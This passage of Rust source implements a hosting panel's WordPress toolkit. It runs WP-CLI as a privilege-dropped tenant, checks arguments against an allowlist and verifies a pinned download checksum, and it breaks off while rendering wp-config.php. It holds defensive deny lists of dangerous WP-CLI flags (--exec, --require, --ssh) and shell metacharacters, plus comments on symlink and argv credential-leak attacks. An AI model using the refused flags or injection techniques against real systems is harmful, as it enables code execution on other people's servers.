//! The WordPress toolkit (spec §11.12 — the wave-5 task sheet calls it
//! §11.14, which in the spec is the App Store; §11.12 is the section this
//! module implements).
//!
//! # The one rule this module exists to keep
//!
//! **WP-CLI runs as the tenant, never as root.** WP-CLI is a PHP program that
//! loads the site's own `wp-config.php`, its plugins and its themes — which is
//! to say it executes code the tenant controls, and on a shared box a plugin is
//! not trusted input. Running that as root would hand every tenant the server.
//!
//! The privilege drop is the same mechanism the file manager uses (spec §5.2
//! rule 3): the agent re-execs *itself* through
//! [`ferrum_distro::exec::reexec_current`], and the child calls
//! `setgroups`/`setgid`/`setuid` — and proves the drop by checking that
//! `setuid(0)` now fails — before it touches anything.
//!
//! What could **not** be reused is the file manager's *protocol*.
//! [`crate::fsops::proto::FsRequest`] is a closed enum of filesystem verbs with
//! no arm that carries a command, and widening it so the file-manager helper
//! could also execute programs would turn the panel's most carefully bounded
//! interface into a general-purpose exec channel — the opposite of what makes
//! it safe. So this module adds a second *entry point* to the same helper
//! machinery (`ferrum-agentd --wp-helper`), not a second privilege-drop
//! mechanism: the re-exec, the uid/gid drop and its proof are literally the
//! same code in `crates/ferrum-agentd/src/main.rs`.
//!
//! # Why `wp.cli` is not a shell
//!
//! A "WP-CLI passthrough" is an obvious place to accidentally build one. This
//! one accepts a [`WpSubcommand`] from a closed enum, then arguments that must
//! survive [`validate_arg`] — no control characters, no shell metacharacters,
//! and no flag from [`RESERVED_WP_FLAGS`]. That last list is the sharp one:
//! WP-CLI's `--require` loads an arbitrary PHP file and `--exec` runs arbitrary
//! PHP, so *either* of them turns a "restricted subcommand" into "run any code
//! as the tenant". `--path` is refused because the panel decides which
//! installation is being operated on, and `--ssh` because it reaches another
//! machine (and builds a shell command line to get there).
//!
//! The metacharacter refusal deserves its own note, because argv already makes
//! shell metacharacters inert *for us*: WP-CLI itself shells out for some `db`
//! subcommands (it builds `mysql`/`mysqldump` command lines internally). Our
//! argv discipline does not extend into another program's process spawning, so
//! values that reach it are filtered here.

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::time::Duration;

use async_trait::async_trait;
use ferrum_config::paths;
use ferrum_core::{
    DbName, Domain, Email, ErrorCode, FerrumError, LinuxUser, Permission, Result, SiteId,
    TenantPath,
};
use ferrum_db::databases::DbEngine;
use ferrum_db::sites::Site;
use ferrum_db::subscriptions::Subscription;
use ferrum_db::wordpress::{NewWpInstall, WpInstall};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::registry::{Execution, OpContext, TypedOperation};

pub mod helper;

// ---------------------------------------------------------------------------
// The pinned WP-CLI release
// ---------------------------------------------------------------------------

/// The WP-CLI release the panel installs and runs. Version, URL and checksum
/// move together — changing one without the others is a bug, not a bump.
pub const WP_CLI_VERSION: &str = "2.12.0";

/// The exact release asset: the self-contained phar.
pub const WP_CLI_URL: &str =
    "https://github.com/wp-cli/wp-cli/releases/download/v2.12.0/wp-cli-2.12.0.phar";

/// SHA-256 of `wp-cli-2.12.0.phar`, pinned.
///
/// Provenance, honestly, on the model of [`crate::adminer::ADMINER_SHA256`]:
///
/// * Computed on 2026-08-28 by downloading the asset from [`WP_CLI_URL`]
///   (7 142 777 bytes) and hashing it.
/// * It agrees with the publisher's own `wp-cli-2.12.0.phar.sha512` asset in
///   the same release (that file's SHA-512 matched the same bytes), and
///   `v2.12.0` was the release GitHub's API reported as `latest` that day.
/// * The release **does** carry a detached OpenPGP signature
///   (`wp-cli-2.12.0.phar.asc`, issuer fingerprint
///   [`WP_CLI_SIGNING_KEY_FPR`], signer notation `releases@wp-cli.org`).
///   **This build does not verify it.** Verifying it would need the WP-CLI
///   release key pinned and checked through `ferrum_distro::pgp`, the way
///   repository keys already are; until that lands, every observation above
///   comes from one host (github.com).
///
/// So this is a **single-source pin** in the sense of
/// `ferrum_distro::repos::UNVERIFIED_PINS`: it protects against a later
/// tampered or truncated download, not against the source having been wrong on
/// the day it was pinned. [`WP_CLI_PIN_PROVENANCE`] carries that fact to the
/// UI, and `wp.detect` reports it.
pub const WP_CLI_SHA256: &str = "ce34ddd838f7351d6759068d09793f26755463b4a4610a5a5c0a97b68220d85c";

/// The OpenPGP key that signed the pinned release, recorded so the follow-up
/// that verifies the signature has the fingerprint to pin. Full 40-hex, never a
/// short key id (spec §11.1).
pub const WP_CLI_SIGNING_KEY_FPR: &str = "63AF7AA15067C05616FDDD88A3A2E8F226F0BC06";

/// Surfaced by `wp.detect` the way `db.adminer.status` surfaces
/// `ADMINER_PIN_PROVENANCE`: an operator learns the pin has one source without
/// reading this file.
pub const WP_CLI_PIN_PROVENANCE: &str = "single-source (sha256 only; the release's OpenPGP \
                                          signature is not verified by this build)";

/// Hard ceiling on the download. The pinned phar is ~6.8 MiB; anything past
/// this is not the file we pinned, and there is no point buffering it to find
/// that out from the hash.
const MAX_PHAR_BYTES: usize = 16 * 1024 * 1024;

// ---------------------------------------------------------------------------
// Timeouts and limits
// ---------------------------------------------------------------------------

/// Immediate operations must answer inside the IPC call timeout
/// (`ferrum_ipc::client::DEFAULT_CALL_TIMEOUT`, 30 s). Twenty-five seconds
/// leaves the operation room to turn a slow WP-CLI into its own clear error
/// instead of the caller seeing `agent_unavailable` from a dead round trip.
/// Work that legitimately takes longer belongs on the task-execution
/// operations (`wp.install`, `wp.update`, `wp.plugin.update`).
const IMMEDIATE_TIMEOUT: Duration = Duration::from_secs(25);

/// Task-execution operations: a core download or a plugin update over a slow
/// link is minutes, not seconds.
const TASK_TIMEOUT: Duration = Duration::from_secs(15 * 60);

/// The most output one WP-CLI run may hand back. `wp plugin list --format=json`
/// on a busy site is kilobytes; a megabyte is already pathological, and the
/// agent must not buffer without a bound just because the child is ours.
pub const MAX_WP_OUTPUT: usize = 1024 * 1024;

/// Most arguments one `wp.cli` call may carry. Not a WP-CLI limit — a bound so
/// a malformed client cannot turn one request into a huge argv.
const MAX_CLI_ARGS: usize = 32;

/// Longest single argument. Long enough for a plugin URL or an option value,
/// short of the point where an argv stops being reviewable.
const MAX_ARG_LEN: usize = 512;

// ---------------------------------------------------------------------------
// The `wp.cli` allowlist
// ---------------------------------------------------------------------------

/// The WP-CLI command groups a caller may reach (spec §11.12).
///
/// An enum rather than a validated string: the set is closed, serde rejects
/// anything outside it before the operation body runs, and adding a group is a
/// deliberate code change rather than a config edit. Notably absent are `eval`,
/// `eval-file`, `shell`, `server`, `package` and `cli` — each of which is a
/// direct "run this PHP" or "install more commands" primitive.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum WpSubcommand {
    Core,
    Plugin,
    Theme,
    Option,
    User,
    Db,
    Cache,
    Rewrite,
}

impl WpSubcommand {
    pub const fn as_str(self) -> &'static str {
        match self {
            WpSubcommand::Core => "core",
            WpSubcommand::Plugin => "plugin",
            WpSubcommand::Theme => "theme",
            WpSubcommand::Option => "option",
            WpSubcommand::User => "user",
            WpSubcommand::Db => "db",
            WpSubcommand::Cache => "cache",
            WpSubcommand::Rewrite => "rewrite",
        }
    }
}

/// WP-CLI global flags a caller may never set, by bare name.
///
/// Public because the privilege-dropping helper enforces the same list on the
/// far side of the boundary: a bug in this module's validator must not be able
/// to become arbitrary PHP execution as the tenant, so the check that matters
/// most is repeated where the privilege actually changes.
///
/// * `path` — the panel decides which installation an operation touches.
/// * `require` — loads an arbitrary PHP file before the command runs.
/// * `exec` — executes arbitrary PHP.
/// * `ssh` — runs the command on another host, over a shell.
/// * `http` — retargets the command at an arbitrary HTTP endpoint.
/// * `prompt` — reads values interactively; with no terminal it hangs until
///   the timeout, which is a denial of service with extra steps.
/// * `context` — selects an alternate WP-CLI runtime context.
pub const RESERVED_WP_FLAGS: &[&str] = &[
    "path", "require", "exec", "ssh", "http", "prompt", "context",
];

/// Second-level commands refused inside an allowed group.
///
/// `wp db cli` opens an interactive `mysql` session, which without a terminal
/// blocks until the timeout kills it.
const RESERVED_SECOND_LEVEL: &[(&str, &str)] = &[("db", "cli")];

/// Bytes that must not appear in an argument.
///
/// Every one of them is a shell metacharacter. Through [`ferrum_distro::Cmd`]
/// they are inert — argv reaches `execve` untouched — but WP-CLI builds its own
/// `mysql` and `mysqldump` command lines for parts of `wp db`, and our argv
/// discipline does not extend into another program's spawning. Filtering here
/// is the only place that can cover that.
const SHELL_METACHARACTERS: &[char] = &[
    ';', '&', '|', '<', '>', '`', '$', '(', ')', '{', '}', '[', ']', '*', '?', '!', '\\', '"',
    '\'', '\n', '\r', '\t',
];

/// Validate one argument on its way to WP-CLI.
///
/// Returns the argument unchanged on success — the caller uses the return
/// value so a future normalisation cannot be silently dropped.
pub fn validate_arg(arg: &str) -> Result<&str> {
    if arg.is_empty() {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            "an empty WP-CLI argument is never meaningful",
        )
        .with_field("args"));
    }
    if arg.len() > MAX_ARG_LEN {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            format!("a WP-CLI argument may be at most {MAX_ARG_LEN} bytes"),
        )
        .with_field("args"));
    }
    if !arg.is_ascii() {
        // WP-CLI values can legitimately be non-ASCII (a post title in
        // Persian), but this operation is the *administrative* passthrough,
        // not a content API, and restricting it to ASCII removes a whole class
        // of homoglyph and normalisation questions from a security boundary.
        // A tenant who needs Unicode values has the WordPress admin.
        return Err(
            FerrumError::new(ErrorCode::InvalidInput, "WP-CLI arguments must be ASCII")
                .with_field("args"),
        );
    }
    if let Some(bad) = arg.chars().find(|c| c.is_ascii_control()) {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            format!(
                "control character {:?} is not allowed in a WP-CLI argument",
                bad
            ),
        )
        .with_field("args"));
    }
    if let Some(bad) = arg.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            format!(
                "`{bad}` is not allowed in a WP-CLI argument: some `wp db` \
                 subcommands build their own shell command lines"
            ),
        )
        .with_field("args"));
    }

    // Flags: `--name` or `--name=value`, plus the `--no-` negation form.
    if let Some(rest) = arg.strip_prefix("--") {
        let name = rest.split('=').next().unwrap_or_default();
        let bare = name.strip_prefix("no-").unwrap_or(name);
        if bare.is_empty()
            || !bare
                .bytes()
                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-' || b == b'_')
        {
            return Err(FerrumError::new(
                ErrorCode::InvalidInput,
                format!("`--{name}` is not a well-formed WP-CLI flag"),
            )
            .with_field("args"));
        }
        if RESERVED_WP_FLAGS.contains(&bare) {
            return Err(FerrumError::new(
                ErrorCode::InvalidInput,
                format!("`--{bare}` is reserved by the panel and cannot be set through wp.cli"),
            )
            .with_field("args"));
        }
        return Ok(arg);
    }

    // A single dash is not a WP-CLI form at all, and `-` alone means stdin to
    // a good many programs.
    if arg.starts_with('-') {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            "WP-CLI flags use the long `--name` form",
        )
        .with_field("args"));
    }
    Ok(arg)
}

/// Validate a whole `wp.cli` request and return the argument vector WP-CLI
/// will receive **after** the panel's own `--path`.
///
/// Split out from the operation so the hostile-input tests can drive it
/// directly: the interesting behaviour is the refusal, not the subprocess.
pub fn validate_cli_args(subcommand: WpSubcommand, args: &[String]) -> Result<Vec<String>> {
    if args.len() > MAX_CLI_ARGS {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            format!("a wp.cli call may carry at most {MAX_CLI_ARGS} arguments"),
        )
        .with_field("args"));
    }

    let mut out = Vec::with_capacity(args.len() + 1);
    out.push(subcommand.as_str().to_string());

    for (index, arg) in args.iter().enumerate() {
        let checked = validate_arg(arg)?;
        // The first positional argument is the second-level command; a handful
        // are refused inside otherwise-allowed groups.
        if index == 0
            && RESERVED_SECOND_LEVEL
                .iter()
                .any(|(group, sub)| *group == subcommand.as_str() && *sub == checked)
        {
            return Err(FerrumError::new(
                ErrorCode::InvalidInput,
                format!(
                    "`wp {} {checked}` is interactive and would hang; it is not available \
                     through wp.cli",
                    subcommand.as_str()
                ),
            )
            .with_field("args"));
        }
        out.push(checked.to_string());
    }
    Ok(out)
}

/// The full WP-CLI argument vector for one call, `--path` first.
///
/// `--path` is prepended by the panel and can never be overridden: a second
/// `--path` would win in WP-CLI, which is exactly why [`RESERVED_WP_FLAGS`]
/// refuses it, and why the helper re-checks that this element is the one it was
/// told about.
pub fn wp_argv(dir: &Path, mut args: Vec<String>) -> Vec<String> {
    let mut argv = Vec::with_capacity(args.len() + 1);
    argv.push(path_flag(dir));
    argv.append(&mut args);
    argv
}

/// The exact `--path=<dir>` string, in one place so the agent and the helper
/// cannot spell it differently.
pub fn path_flag(dir: &Path) -> String {
    format!("--path={}", dir.display())
}

// ---------------------------------------------------------------------------
// Running WP-CLI
// ---------------------------------------------------------------------------

/// What one WP-CLI run produced.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WpOutput {
    pub status: i32,
    pub stdout: String,
    pub stderr: String,
}

impl WpOutput {
    pub fn success(&self) -> bool {
        self.status == 0
    }

    /// The most useful text to show a human when this run failed.
    pub fn failure_text(&self) -> String {
        let stderr = self.stderr.trim();
        if stderr.is_empty() {
            self.stdout.trim().to_string()
        } else {
            stderr.to_string()
        }
    }

    fn into_result(self, what: &str) -> Result<Self> {
        if self.success() {
            return Ok(self);
        }
        Err(FerrumError::new(
            ErrorCode::CommandFailed,
            format!(
                "{what} failed (exit {}): {}",
                self.status,
                self.failure_text()
            ),
        ))
    }
}

/// How one tenant's WP-CLI runs get executed. The same shape, and the same
/// reasoning, as [`crate::fsops::FsRunner`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WpRunner {
    /// Re-exec the agent binary and drop to this uid/gid before running PHP.
    /// The production path; requires the agent to be root, because `setuid` to
    /// another account is a root-only call.
    Tenant { uid: u32, gid: u32 },
    /// Run PHP in-process's own privilege — **no privilege drop**.
    ///
    /// Selected only when the agent is *already* unprivileged (`--dev`, tests):
    /// there is no privilege to shed, `setuid` would fail, and the directories
    /// involved are throwaway ones owned by the user already running. A root
    /// agent never selects this variant.
    Local,
}

impl WpRunner {
    /// Pick the runner for an account, refusing a tenant that maps to root.
    pub fn for_user(linux_user: &LinuxUser) -> Result<Self> {
        // SAFETY: `geteuid` reads process state and cannot fail.
        if unsafe { libc::geteuid() } != 0 {
            return Ok(WpRunner::Local);
        }
        let (uid, gid) = passwd_entry(linux_user.as_str()).ok_or_else(|| {
            FerrumError::new(
                ErrorCode::NotFound,
                format!(
                    "the Linux account `{}` does not exist on this server",
                    linux_user.as_str()
                ),
            )
        })?;
        // A tenant resolving to uid or gid 0 means the account database is
        // wrong in a way no WP-CLI run should get near: "drop" to root is not
        // a drop, and WP-CLI loads tenant-authored PHP.
        if uid == 0 || gid == 0 {
            return Err(FerrumError::internal(format!(
                "`{}` maps to uid/gid 0; refusing to run WP-CLI as root",
                linux_user.as_str()
            )));
        }
        Ok(WpRunner::Tenant { uid, gid })
    }

    /// Run WP-CLI in `dir` with `args` (already validated, `--path` not yet
    /// prepended).
    pub async fn run(
        &self,
        home: &Path,
        dir: &Path,
        args: Vec<String>,
        timeout: Duration,
    ) -> Result<WpOutput> {
        let argv = wp_argv(dir, args);
        match self {
            WpRunner::Local => helper::run_wp_cli(home, dir, &argv, timeout).await,
            WpRunner::Tenant { uid, gid } => {
                run_helper_process(*uid, *gid, home, dir, &argv, timeout).await
            }
        }
    }
}

/// Resolve an account through `getpwnam`, so NSS sources work the same way
/// they do for every other program on the box. (The same helper `fsops` uses;
/// duplicated rather than hoisted because hoisting means editing another
/// module mid-wave — see the integrator note.)
fn passwd_entry(username: &str) -> Option<(u32, u32)> {
    let c_name = std::ffi::CString::new(username).ok()?;
    // SAFETY: `getpwnam` returns a pointer into a static buffer owned by libc;
    // we read it immediately and copy out the two integers we need.
    unsafe {
        let pw = libc::getpwnam(c_name.as_ptr());
        if pw.is_null() {
            return None;
        }
        Some(((*pw).pw_uid, (*pw).pw_gid))
    }
}

/// Spawn `ferrum-agentd --wp-helper` for one run and read its single-line JSON
/// reply.
///
/// The argv is built entirely by the agent: two integers, two absolute paths
/// the caller never chose, and an argument vector that already survived
/// [`validate_cli_args`]. The child receives an empty environment
/// ([`reexec_current`](ferrum_distro::exec::reexec_current) clears it) and
/// establishes its own.
async fn run_helper_process(
    uid: u32,
    gid: u32,
    home: &Path,
    dir: &Path,
    argv: &[String],
    timeout: Duration,
) -> Result<WpOutput> {
    use tokio::io::AsyncReadExt;

    let mut args: Vec<OsString> = vec![
        "--wp-helper".into(),
        "--uid".into(),
        uid.to_string().into(),
        "--gid".into(),
        gid.to_string().into(),
        "--home".into(),
        home.as_os_str().to_os_string(),
        "--dir".into(),
        dir.as_os_str().to_os_string(),
        "--".into(),
    ];
    args.extend(argv.iter().map(OsString::from));

    let mut cmd = ferrum_distro::exec::reexec_current(&args).map_err(FerrumError::from)?;
    cmd.stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        // If the agent (or this future) dies mid-run, the helper must not
        // linger holding a tenant's uid.
        .kill_on_drop(true);

    let mut child = cmd
        .spawn()
        .map_err(|e| FerrumError::internal(format!("could not spawn the WP-CLI helper: {e}")))?;

    let exchange = async {
        let mut stdout = child.stdout.take().expect("stdout was piped");
        let mut stderr = child.stderr.take().expect("stderr was piped");

        // Bounded: even our own child does not get to make the agent buffer
        // without a limit. The size is derived, not guessed — the helper caps
        // each of two streams at MAX_WP_OUTPUT, and JSON's worst-case escape
        // (a control byte becomes a six-character `\uXXXX`) inflates a stream
        // sixfold, so a legitimate reply cannot fit in more than
        // 12 × MAX_WP_OUTPUT of JSON. Sixteen leaves
        // room for the field names and still stops a runaway child.
        let mut reply = Vec::new();
        (&mut stdout)
            .take((16 * MAX_WP_OUTPUT) as u64)
            .read_to_end(&mut reply)
            .await?;
        let mut diagnostics = String::new();
        let _ = (&mut stderr)
            .take(64 * 1024)
            .read_to_string(&mut diagnostics)
            .await;
        let status = child.wait().await?;
        Ok::<_, std::io::Error>((reply, diagnostics, status))
    };

    match tokio::time::timeout(timeout, exchange).await {
        Err(_) => Err(FerrumError::new(
            ErrorCode::AgentTimeout,
            "WP-CLI did not finish in time",
        )),
        Ok(Err(e)) => Err(FerrumError::internal(format!(
            "the WP-CLI helper broke off mid-reply: {e}"
        ))),
        Ok(Ok((reply, diagnostics, status))) => {
            if !status.success() {
                // A non-zero exit from the *helper* outranks anything on
                // stdout: it means the helper itself failed, and the failure
                // that matters most is the privilege drop refusing to proceed.
                return Err(FerrumError::internal(format!(
                    "the WP-CLI helper exited with {status}: {}",
                    diagnostics.trim()
                )));
            }
            serde_json::from_slice::<WpOutput>(&reply).map_err(|e| {
                FerrumError::internal(format!("the WP-CLI helper answered out of shape: {e}"))
            })
        }
    }
}

// ---------------------------------------------------------------------------
// Fetching and installing the phar
// ---------------------------------------------------------------------------

/// Fetches the WP-CLI phar. A trait so the tests exercise verify-and-refuse
/// without a network.
#[async_trait]
pub trait PharFetcher: Send + Sync {
    async fn fetch(&self, url: &str) -> Result<Vec<u8>>;
}

/// The real fetcher: HTTPS only, bounded, same posture as the Adminer download.
pub struct HttpsPharFetcher;

#[async_trait]
impl PharFetcher for HttpsPharFetcher {
    async fn fetch(&self, url: &str) -> Result<Vec<u8>> {
        if !url.starts_with("https://") {
            return Err(FerrumError::internal(format!(
                "refusing to fetch WP-CLI over `{url}`"
            )));
        }
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(120))
            .user_agent(concat!("ferrum/", env!("CARGO_PKG_VERSION")))
            // A redirect to http:// would drop the transport security the
            // checksum pin supplements rather than replaces.
            .https_only(true)
            .build()
            .map_err(|e| FerrumError::internal(format!("could not build an HTTP client: {e}")))?;

        let response = client.get(url).send().await.map_err(|e| {
            FerrumError::new(
                ErrorCode::PackageBackendFailed,
                format!("could not download {url}: {e}"),
            )
        })?;
        if !response.status().is_success() {
            return Err(FerrumError::new(
                ErrorCode::PackageBackendFailed,
                format!("{url} returned {}", response.status()),
            ));
        }
        let bytes = response.bytes().await.map_err(|e| {
            FerrumError::new(
                ErrorCode::PackageBackendFailed,
                format!("could not read {url}: {e}"),
            )
        })?;
        if bytes.len() > MAX_PHAR_BYTES {
            return Err(FerrumError::new(
                ErrorCode::PackageBackendFailed,
                format!(
                    "{url} served {} bytes; the pinned WP-CLI phar is ~6.8 MiB",
                    bytes.len()
                ),
            ));
        }
        Ok(bytes.to_vec())
    }
}

/// Refuse anything whose SHA-256 is not the pinned one.
///
/// Takes the expected hash as a parameter so the tests can prove both
/// directions without embedding a 7 MB phar in the test suite.
pub fn verify_sha256(bytes: &[u8], expected_hex: &str) -> Result<()> {
    let actual = hex::encode(Sha256::digest(bytes));
    if actual == expected_hex {
        return Ok(());
    }
    Err(FerrumError::new(
        ErrorCode::PackageBackendFailed,
        format!(
            "the WP-CLI download failed checksum verification: expected sha256 \
             {expected_hex}, got {actual} ({} bytes). Nothing was installed. This is \
             either a corrupted download or a tampered file — do not bypass this check.",
            bytes.len()
        ),
    ))
}

/// Is the pinned phar already on disk, with the right bytes?
///
/// Hashing the file rather than trusting its existence is what makes a partial
/// or replaced download self-healing: the next install re-fetches.
pub fn phar_is_pinned(path: &Path) -> bool {
    match std::fs::read(path) {
        Ok(bytes) => verify_sha256(&bytes, WP_CLI_SHA256).is_ok(),
        Err(_) => false,
    }
}

/// Download, verify and install the phar unless it is already there.
///
/// Installed root-owned 0755 under the panel's data directory: a tenant runs
/// it (as themselves) but must never be able to replace it — the panel invokes
/// it while the tenant's own PHP is about to be loaded, and a swapped phar
/// would be code the panel chose to run.
async fn ensure_wp_cli(ctx: &OpContext, fetcher: &dyn PharFetcher) -> Result<PathBuf> {
    let phar = paths::wp_cli_phar();
    if phar_is_pinned(&phar) {
        return Ok(phar);
    }

    ctx.log(format!("downloading WP-CLI {WP_CLI_VERSION}"));
    let bytes = fetcher.fetch(WP_CLI_URL).await?;
    verify_sha256(&bytes, WP_CLI_SHA256)?;
    write_bytes_atomic(&phar, &bytes, 0o755)?;
    ctx.log(format!(
        "installed WP-CLI {WP_CLI_VERSION} at {} (sha256 verified)",
        phar.display()
    ));
    Ok(phar)
}

/// Write `bytes` to `path` atomically with `mode`.
///
/// Not `ferrum_config::managed::write_atomic`: that prepends the
/// FERRUM-MANAGED comment header, and a phar is a signed archive whose bytes
/// must hash to the pin exactly.
fn write_bytes_atomic(path: &Path, bytes: &[u8], mode: u32) -> Result<()> {
    use std::io::Write;
    use std::os::unix::fs::PermissionsExt;

    let dir = path
        .parent()
        .ok_or_else(|| FerrumError::internal(format!("{} has no parent", path.display())))?;
    std::fs::create_dir_all(dir)
        .map_err(|e| FerrumError::internal(format!("could not create {}: {e}", dir.display())))?;

    let mut temp = dir.join(path.file_name().unwrap_or_default());
    temp.as_mut_os_string().push(".ferrum-tmp");
    {
        let mut file = std::fs::File::create(&temp).map_err(|e| {
            FerrumError::internal(format!("could not create {}: {e}", temp.display()))
        })?;
        file.write_all(bytes).map_err(|e| {
            FerrumError::internal(format!("could not write {}: {e}", temp.display()))
        })?;
        file.set_permissions(std::fs::Permissions::from_mode(mode))
            .map_err(|e| {
                FerrumError::internal(format!("could not chmod {}: {e}", temp.display()))
            })?;
        file.sync_all().map_err(|e| {
            FerrumError::internal(format!("could not sync {}: {e}", temp.display()))
        })?;
    }
    std::fs::rename(&temp, path).map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        FerrumError::internal(format!("could not move {} into place: {e}", path.display()))
    })
}

// ---------------------------------------------------------------------------
// Resolving whose WordPress this is
// ---------------------------------------------------------------------------

/// A resolved WordPress target: whose account, which directory, which runner.
pub struct WpTarget {
    pub site: Site,
    pub subscription: Subscription,
    pub home: PathBuf,
    /// Absolute installation directory.
    pub dir: PathBuf,
    /// The same directory expressed relative to the home, for the file-manager
    /// helper (which only ever speaks tenant-relative paths).
    pub rel: TenantPath,
    pub runner: WpRunner,
}

impl WpTarget {
    async fn run(&self, args: Vec<String>, timeout: Duration) -> Result<WpOutput> {
        self.runner.run(&self.home, &self.dir, args, timeout).await
    }
}

/// Resolve a site the caller's scope can see into a WordPress target.
///
/// `subdirectory` is only meaningful for `wp.install`; every other operation
/// takes the directory recorded on the install row, so a caller cannot point an
/// update at a directory of their choosing.
async fn target_for_site(
    ctx: &OpContext,
    site_id: SiteId,
    subdirectory: Option<&TenantPath>,
) -> Result<WpTarget> {
    let site = ctx
        .db()
        .sites(ctx.scope())
        .by_id(site_id)
        .await
        .map_err(FerrumError::from)?
        .ok_or_else(|| FerrumError::not_found("site"))?;

    // Resolving the subscription through `Global` is safe *because* the site
    // came out of a scoped read: the site is already proof the caller may see
    // this subscription, and a second scoped read would only be able to
    // disagree with the first.
    let subscription = ctx
        .db()
        .subscriptions(&ferrum_core::TenantScope::Global)
        .by_id(site.subscription_id)
        .await
        .map_err(FerrumError::from)?
        .ok_or_else(|| FerrumError::not_found("subscription"))?;

    let linux_user = LinuxUser::parse(&subscription.linux_user)?;
    let home = PathBuf::from(&subscription.home_dir);
    let root = PathBuf::from(&site.root_dir);

    // The document root must be inside the home, or the privilege drop buys
    // nothing: the tenant's uid would have no particular rights there, and the
    // tenant-relative path the file helper needs could not be computed. A site
    // whose root was pointed elsewhere by hand is reported, not worked around.
    let rel_root = root.strip_prefix(&home).map_err(|_| {
        FerrumError::new(
            ErrorCode::InvalidPath,
            format!(
                "the document root of `{}` ({}) is not inside the tenant home ({}); \
                 the WordPress toolkit only manages installations inside a tenant home",
                site.domain,
                root.display(),
                home.display()
            ),
        )
    })?;

    let rel = match subdirectory {
        Some(sub) if !sub.as_str().is_empty() => {
            TenantPath::parse(&format!("{}/{}", rel_root.to_string_lossy(), sub.as_str()))?
        }
        _ => TenantPath::parse(&rel_root.to_string_lossy())?,
    };
    let dir = home.join(rel.as_str());

    Ok(WpTarget {
        site,
        subscription,
        home,
        dir,
        rel,
        runner: WpRunner::for_user(&linux_user)?,
    })
}

/// Resolve an install id, through the caller's scope, into its target.
async fn target_for_install(ctx: &OpContext, install_id: i64) -> Result<(WpInstall, WpTarget)> {
    let install = ctx
        .db()
        .wp_installs(ctx.scope())
        .by_id(install_id)
        .await
        .map_err(FerrumError::from)?
        .ok_or_else(|| FerrumError::not_found("WordPress installation"))?;

    let mut target = target_for_site(ctx, install.site_id, None).await?;
    // The row's own path wins over the one derived from the site: if the site's
    // document root moved after the install, the files are still where they
    // were, and operating on the derived directory would silently touch the
    // wrong tree (or nothing at all).
    target.dir = PathBuf::from(&install.path);
    if let Ok(rel) = PathBuf::from(&install.path).strip_prefix(&target.home) {
        target.rel = TenantPath::parse(&rel.to_string_lossy())?;
    }
    Ok((install, target))
}

// ---------------------------------------------------------------------------
// wp-config.php
// ---------------------------------------------------------------------------

/// The eight authentication constants WordPress expects, in the order it
/// documents them.
const SALT_CONSTANTS: &[&str] = &[
    "AUTH_KEY",
    "SECURE_AUTH_KEY",
    "LOGGED_IN_KEY",
    "NONCE_KEY",
    "AUTH_SALT",
    "SECURE_AUTH_SALT",
    "LOGGED_IN_SALT",
    "NONCE_SALT",
];

/// Alphabet for generated secrets.
///
/// Deliberately excludes `'` and `\` — the only two bytes that mean anything
/// inside a PHP single-quoted string — so a generated value can never end its
/// own literal. [`php_single_quoted`] refuses them as well; this is the belt to
/// that braces.
const SECRET_ALPHABET: &[u8] =
    b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#%^&*()-_=+[]{}<>.,:;/?";

/// A cryptographically random string of `len` characters.
///
/// `rand::thread_rng` is a CSPRNG (ChaCha, seeded from the OS), which is what
/// `db::generate_password` already relies on for database passwords. A
/// WordPress salt is a signing key: a predictable one lets anyone forge auth
/// cookies for the site.
fn random_secret(len: usize) -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    (0..len)
        .map(|_| SECRET_ALPHABET[rng.gen_range(0..SECRET_ALPHABET.len())] as char)
        .collect()
}

/// Quote a value for a PHP single-quoted string literal.
///
/// Refuses rather than escapes. Every value this module puts in `wp-config.php`
/// is either a generated secret from [`SECRET_ALPHABET`] or a [`DbName`]
/// (`[A-Za-z0-9_]`), so a rejection here means a bug upstream, not a user
/// typing something exotic — and a silent escape would hide it.
pub fn php_single_quoted(value: &str) -> Result<String> {
    if value
        .bytes()
        .any(|b| b == b'\'' || b == b'\\' || b.is_ascii_control())
    {
        return Err(FerrumError::internal(
            "a wp-config.php value contained a quote, a backslash or a control character",
        ));
    }
    Ok(format!("'{value}'"))
}

/// Everything `wp-config.php` needs that is not a constant.
pub struct WpConfig<'a> {
    pub db_name: &'a str,
    pub db_user: &'a str,
    pub db_password: &'a str,
    pub db_host: &'a str,
    pub table_prefix: &'a str,
}

/// Render `wp-config.php`.
///
/// The panel renders this itself rather than calling `wp config create`, and
/// the reason is the database password. `wp config create` takes it as
/// `--dbpass=...`, which puts a long-lived credential in a process's argv —
/// world-readable through `/proc/<pid>/cmdline` for the life of that process,
/// on a box whose whole point is that other people's code runs on it. Rendering
/// here keeps that password to two places: this string, and the file it is
/// written into.
///
/// The file is written **by the tenant**, through the file-manager helper, for
/// a second reason: the install directory is tenant-controlled, so a root
/// process writing `wp-config.php` there could be aimed at `/etc/shadow` with a
/// pre-placed symlink. The helper resolves paths as the tenant and refuses
/// symlinks (spec §11.7).
pub fn render_wp_config(cfg: &WpConfig<'_>) -> Result<String> {
    let mut out = String::with_capacity(4096);
    out.push_str("<?php\n");
    out.push_str("/**\n * WordPress configuration, generated by Ferrum (spec §11.12).\n");
    out.push_str(" * Salts below come from a CSPRNG on this server and are unique to\n");
    out.push_str(" * this installation. Changing them logs every user out.\n */\n\n");

    out.push_str(&format!(
